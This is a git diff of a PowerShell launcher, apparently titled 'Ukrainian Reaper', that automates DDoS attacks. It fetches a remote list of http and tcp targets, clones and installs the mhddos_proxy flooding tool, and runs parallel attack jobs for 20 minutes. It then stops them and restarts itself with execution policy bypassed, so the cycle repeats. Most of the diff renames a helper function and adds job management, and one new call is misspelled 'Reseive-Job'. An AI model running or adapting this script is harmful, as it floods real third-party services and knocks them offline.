@@ -13,17 +13,16 @@ $LogoTxt = Get-Content -Path "$PsScriptRoot\Logo.txt"
 $LogoSize = $LogoTxt.Length
 for ($i=0; $i -lt $LogoSize; $i++ ) {
     $fgColor = $i -lt ( $LogoSize/2) ? "Blue" : "Yellow"
-    Write-MidleHost $LogoTxt[$i] -ForegroundColor $fgColor -BackgroundColor 'Black'
+    Write-MiddleHost $LogoTxt[$i] -ForegroundColor $fgColor -BackgroundColor 'Black'
 }
-Write-MidleHost "УКРАЇНСЬКИЙ ЖНЕЦЬ"
-Write-MidleHost "Powershell v.$($PSVersionTable.PSVersion)" -ForegroundColor 'Green'
+Write-MiddleHost "УКРАЇНСЬКИЙ ЖНЕЦЬ"
+Write-MiddleHost "Powershell v.$($PSVersionTable.PSVersion)" -ForegroundColor 'Green'
 
 # get targets
 # select lines started with http or tcp only, split them by space
 # resolve ip addresses and remove duplicated (first unique persist)
 # If ip was not resolved asume as unique
-
-Write-MidleHost "Завантаження цілей" -NoNewline
+Write-MiddleHost "Завантаження цілей" -NoNewline
 $TargetsSrc = "https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets"
 $TargetsList = ( ( Download-String -SourceUrl $TargetsSrc ) -split "\n" |
     Where-Object { ($_ -like 'http*') -or ($_ -like 'tcp://*') }).Split(" ") |
@@ -45,10 +44,10 @@ for ($i = 0; $i -lt $NumberOfTargetsFiles; $i++) {
     ($TargetsList[$s..$e] -join "`n").Trim() | Out-File "$RootPath\tmp\$($TargetFiles[$i])" -NoNewline
 }
 
-Write-MidleHost "Знайдено $NumberOfTargets цілей" -Here -NoNewline
+Write-MiddleHost "Знайдено $NumberOfTargets цілей" -Here -NoNewline
 $TargetsList = $null
 
-Write-MidleHost "Завантаження mhddos_proxy" -NoNewline
+Write-MiddleHost "Завантаження mhddos_proxy" -NoNewline
 $RemoteMhddosProxy = 'https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git'
 $StartParams = @{
     'FilePath' = "$RootPath\Git\cmd\git.exe"
@@ -63,14 +62,14 @@ else {
 }
 Start-Process @StartParams
 
-Write-MidleHost "Створення та активація віртуального середовища" -Here -NoNewline
+Write-MiddleHost "Створення та активація віртуального середовища" -Here -NoNewline
 &"$PyPath\python.exe" -m virtualenv $VenvPath --quiet
 &"$VenvPath\Scripts\activate.ps1"
 
-Write-MidleHost "Завантаження додаткових компонентів mhddos_proxy" -Here -NoNewline
+Write-MiddleHost "Завантаження додаткових компонентів mhddos_proxy" -Here -NoNewline
 &"$PyPath\python.exe" -m pip install -r "$LocalMhddosProxy\requirements.txt" --quiet
 
-Write-MidleHost "Запуск mhddos_proxy" -Here -NoNewline
+Write-MiddleHost "Запуск mhddos_proxy" -Here -NoNewline
 $BackgroundJob = { 
     $StartParams = @{
         'FilePath' = "$PyPath\python.exe"
@@ -81,16 +80,35 @@ $BackgroundJob = {
     }
     Start-Process @StartParams
 }
+
 try {
     $JobCount = 0
+    [System.Collections.ArrayList]$jobList = @()
     foreach ($targetFile in $TargetFiles) {
         $FilePath = "$RootPath\tmp\$targetFile"
-        $Job = Start-ThreadJob -ScriptBlock $BackgroundJob -Name "Multidd$JobCount"
+        $Multidd = Start-ThreadJob -ScriptBlock $BackgroundJob -Name "Multidd$JobCount"
+        Reseive-Job -Job $Multidd -Keep | Format-Table
+        $jobList.Add( $Multidd )
+    }
+    $Multidd = $null
+    Start-Sleep -Seconds 1200 # wait for 20 minutes
+}
+catch { }
+finally {
+    Write-MiddleHost "Завершення роботи mhddos_proxy" -Here -NoNewline
+    foreach ($Multidd in $jobList) {
+        $Name = $Multidd.Name
+        Receive-Job -Job $Multidd | Stop-Process -Force -ErrorAction Ignore
+        if ($?) { Write-MiddleHost "Python для $Name завершено" }
+        else { Write-MiddleHost "Не вдалося завершити роботу Python.exe для $Name" -ForegroundColor Red }
+        Stop-job -Job $Multidd -PassThru | Remove-Job -Force
     }
 }
-catch {
-
+$StartParams = @{
+    'FilePath' = "$RootPath\Powershell\pwsh.exe"
+    'ArgumentList' = "-ExecutionPolicy Bypass -File `"$RootPath\PsScripts\Start.ps1`""
+    'NoNewWindow' = $true
+    'Wait' = $false
 }
-finally {
-
-}
+Write-MiddleHost "Перезапуск"
+Start-Process @StartParams
